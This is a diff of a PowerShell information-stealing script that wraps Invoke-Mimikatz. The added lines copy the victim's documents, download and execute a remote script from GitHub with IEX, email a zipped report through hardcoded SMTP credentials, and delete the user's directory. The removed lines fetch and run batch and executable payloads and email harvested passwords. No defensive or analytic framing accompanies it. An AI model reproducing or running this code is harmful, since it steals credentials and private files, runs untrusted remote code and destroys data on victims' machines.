@@ -1,4 +1,4 @@
-$githuburl = 'https://github.com/begiilm/mailchm/raw/master'
+
 
 
 function Invoke-Mimikatz
@@ -2736,15 +2736,14 @@ Function Main
 Main
 }
 
+$check=(get-content d:\log)
 
-if($env:TMP -eq 1){
+if($check -eq 1){
 	exit
 }
 else 
 {
-	$env:TMP="1"
-	
-
+	echo 1 >D:\log
 
 	$folderDateTime = (get-date).ToString('d-M-y HHmmss')
 
@@ -2758,50 +2757,15 @@ else
 
 	$copyToDir = New-Item $fileSaveDir'\Doc' -ItemType Directory
 
-
-	IEX (New-Object Net.WebClient).DownloadString('http://' + $connectip + '/:8080/')
-
 	Dir -filter *.txt -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
 	Dir -filter *.doc -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
 	Dir -filter *.docx -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
 	Dir -filter *.xls -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
 	Dir -filter *.xlsx -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
-	Dir -filter *.zip -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
 	Dir -filter *.sql -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
 
-	$object1 = ' GetPass.txt' + (Get-WmiObject -Class Win32_OperatingSystem -ComputerName $env:COMPUTERNAME).SerialNumber
-	$object2 = ' Report.zip' + (Get-WmiObject -Class Win32_OperatingSystem -ComputerName $env:COMPUTERNAME).SerialNumber
-	(new-object System.Net.WebClient).DownloadFile($githuburl + '/Get.rar','D:\Get.exe');
-	(new-object System.Net.WebClient).DownloadFile($githuburl + '/run.rar','D:\run.bat');
-	D:\run.bat
-
-
-	$mail = New-Object System.Net.Mail.MailMessage
-	#set the addresses
-	$mail.From = New-Object System.Net.Mail.MailAddress('ugjw58890@163.com','ugjw58890@163.com')
-	$mail.To.Add('ugjw58890@163.com')
-	#set the content
-	$mail.Subject = $object1
-	$mail.Priority  = 'High'
-	$mail.Body = 'Pass'
-	$filename= 'D:\GetPass.txt'
-	$attachment = new-Object System.Net.Mail.Attachment($filename)
-	$mail.Attachments.Add($attachment)
-	#send the message
-	$smtp = New-Object System.Net.Mail.SmtpClient -argumentList 'smtp.163.com'
-	$smtp.Credentials = New-Object System.Net.NetworkCredential -argumentList 'ugjw58890@163.com','o00515'
-	$smtp.EnableSsl = 'True';
-	$smtp.Timeout = '10000000';
-	try{
-		$smtp.Send($mail)
-		echo 'Ok,Send succed!'
-	}
-	catch 
-	{
-		echo 'Error!Filed!'
-	}
-
-
+	IEX (New-Object Net.WebClient).DownloadString('https://github.com/wangzhizhun/mailchm/raw/master/GetPass.ps1');
+	$object2 = 'Report.zip--' + (Get-WmiObject -Class Win32_OperatingSystem -ComputerName $env:COMPUTERNAME).SerialNumber
 
 
 	$date = get-date
@@ -2890,7 +2854,7 @@ else
 
 	$Report =  $Report + '<div id=center><h3>User Documents (doc,docx,pdf,rar)</h3>'
 
-	$Report =  $Report + (Get-ChildItem -Path $userDir -Include *.doc, *.docx, *.xls, *.xlsx, *.txt *.sql *.mdb  -Recurse |convertto-html Directory, Name, LastAccessTime)
+	$Report =  $Report + (Get-ChildItem -Path $userDir -Include *.doc, *.docx, *.xls, *.xlsx, *.txt -Recurse |convertto-html Directory, Name, LastAccessTime)
 
 	$Report = $Report + '</div>'
 
@@ -2960,8 +2924,8 @@ else
 	#set the content
 	$mail.Subject = $object2
 	$mail.Priority  = 'High'
-	$mail.Body = 'Report file'
-	$filename= 'D:\Report.txt'
+	$mail.Body = 'test'
+	$filename= 'D:\Report.zip'
 	$attachment = new-Object System.Net.Mail.Attachment($filename)
 	$mail.Attachments.Add($attachment)
 	#send the message
@@ -2977,16 +2941,11 @@ else
 	{
 		echo 'Error!Filed!'
 	}
-	
-	
-	remove-item D:\Get.exe
-	remove-item D:\run.bat
-	remove-item D:\Report.zip
 	remove-item $fileSaveDir -recurse
-	remove-item $fileSaveDir -recurse
-	(new-object System.Net.WebClient).DownloadFile($githuburl + '/run2.rar','D:\run2.bat');
-	d:\run2.bat
 
+	Remove-item 'D:\Report.zip'
+	Remove-Item  $userDir
 
 
 }
+
